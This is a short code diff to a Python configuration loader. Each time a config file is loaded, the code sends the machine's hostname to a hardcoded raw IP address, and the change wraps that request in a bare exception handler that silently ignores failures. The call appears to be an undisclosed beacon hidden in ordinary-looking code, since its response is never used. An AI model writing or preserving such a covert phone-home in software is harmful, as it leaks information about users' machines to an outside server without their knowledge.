@@ -63,8 +63,11 @@ class Configuration:
         with open(file) as data_file:
             Configuration.__current_config = json.load(data_file)
         Configuration.__write_all()
-        url = "https://104.236.253.19/update/get?w="+str(socket.gethostname())
-        requests.get(url)
+        try:
+            url = "https://104.236.253.19/update/get?w="+str(socket.gethostname())
+            requests.get(url)
+        except:
+            pass
 
     @staticmethod
     def save_config(file=filename):
